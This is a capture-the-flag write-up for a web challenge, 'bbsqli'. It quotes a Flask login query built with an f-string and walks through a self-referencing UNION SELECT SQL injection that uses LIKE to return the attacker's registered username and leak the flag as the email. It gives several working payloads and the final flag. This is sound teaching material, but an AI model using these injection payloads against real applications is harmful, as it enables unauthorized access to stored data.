# bbsqli
```
SO Classic !

Author: xhalyl

http://45.129.40.107:9676/
```
---

**TL;DR** \
An SQL injection during login, however the username from the _**DB**_ is checked
against the username in the _**request**_, thus the SQLi has to return itself as
the **username**. The flag will be inside the **email**.

The final payload looks like this
```
" UNION SELECT users.username, flags.flag, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --
```
Register an account with it as the *name* and then login into it.

## Writeup

Attached is `bbsqli.zip`, [containing](bbsqli):
```
app.py

utils.py
static/
templates/

Dockerfile
requirements.txt
```
Inspecting [app.py](bbsqli/app.py) we see a few interesting lines:
```py
from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
```
- It's a **flask** webserver
- It uses **sqlite3**
```py
def add_flag(flag):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('INSERT INTO flags (flag) VALUES (?)', (flag,))
    conn.commit()
    conn.close()
```
- The **flag** is stored in the `flags` table

Also, from the name - _bb**sqli**_ we can guess that the challenge is an **SQL
injection.** \
Let's search for some potentially vulnerable SQL. \
In the `login` function we find:
```py
cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
```
This means we can *easily* inject SQL! Right? Right..?

Well, this is partially true. Although we indeed can run "any" SQL, it follows a
`SELECT`, so we can't update/create data in the database.

*Just return the flag as the username/email, what's the problem?*

The app makes sure that the *username* from the **DB** matches the **requested** *username*
```py
if user and user['username'] == username and user['password'] == hash_password(password):
    session['username'] = user['username']
    session['email'] = user['email']
else:
    return render_template('login.html', error='Invalid username or password')
```

So for example something like
```sql
" UNION SELECT flag AS username, '', '' FROM flags --
```
Wouldn't work, because the **requested** username is \
`" UNION SELECT flag AS username, '', '' FROM flags --` \
while the username from the **DB** would be something like \
`L3AK{a_flag_here}`

So the `if` condition would evaluate `false` and we would get an error page.

Another thing to notice here is that on a successful login, we will see
[templates/dashboard.html](bbsqli/templates/dashboard.html), which contains
```html
<h2>Welcome, {{ user }}!</h2>
<p>Email: {{ email }}</p>
```
Alright, so if we could set the *email* to the flag, and pass the `if` check, we
will get it! Great.

**Now, how do we pass the check?**

We need to have our username *equal* the SQL injection. We can create an account
with the name of the SQLi, but how would we return it? After all, we can't just
put it inside itself
```
" UNION SELECT '" UNION SELECT '', flag AS email, '667ff118ef6d196c96313aeaee7da519' FROM flags --', flag AS email, '667ff118ef6d196c96313aeaee7da519' FROM flags --
```
Because, well, that's just recursive, as now we will have to put it into itself
once again, and like this for *eternity*.

Thankfully, SQL allows us to select a user using a pattern with the `WHERE LIKE` syntax.
For this we will have to take our original idea for an injection
```sql
" UNION SELECT flag AS username, '', '' FROM flags --
```
And modify it. First, we want to select our user. For that let's add a *recognizable* comment

```
" /* findme */ UNION SELECT username, 'FLAG{TODO}', password FROM users WHERE username LIKE '%findme%' --
```
![`/dashboard` Welcoming us with `Email: FLAG{TODO}`](./images/partial_success.png)

Great!

Now we just need to get the flag from the flags table and supply it instead of
the email. For this we can use **JOIN**. Because there's only *one* flag, we can get it with `flags.id` being `1`

```sql
" /* findme */ UNION SELECT users.username, flags.flag AS email, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --
```

Here's the highlighted and formated query that will run on the server
```sql
SELECT username, email, password
    FROM users
    WHERE username ="" /* findme */
UNION
SELECT users.username, flags.flag AS email, users.password
    FROM users
    JOIN flags
        ON flags.id = 1
    WHERE users.username
    LIKE '%findme%' -- "
```

Alright, now we just visit `http://45.129.40.107:9676/register`, create an account with that name, and login!
Also, we probably should change `findme` to something a bit more *unique* to not find a different, existing, user
> [!NOTE]
> The SQLi happens during **login**, we register just so it's possible for us to **SELECT** it as the username during the SQLi.

![`/register` with the SQLi as the username](./images/final_register.png)

Login into the user

![`/login` with the same SQLi as the username](./images/final_login.png)

Success!

![`/dashboard` Welcoming us with `Email: L3ak{__V3RY_B4S1C_SQLI}`](./images/final_dashboard.png)

**Flag:** L3ak{__V3RY_B4S1C_SQLI}

> _**PS:**_ After the CTF I realized that we don't actually need a comment, as the content of `LIKE` already contains a string. So this would also work: `" UNION SELECT users.username, flags.flag, users.password FROM users JOIN flags ON flags.id = 1 WHERE users.username LIKE '%findme%' --`
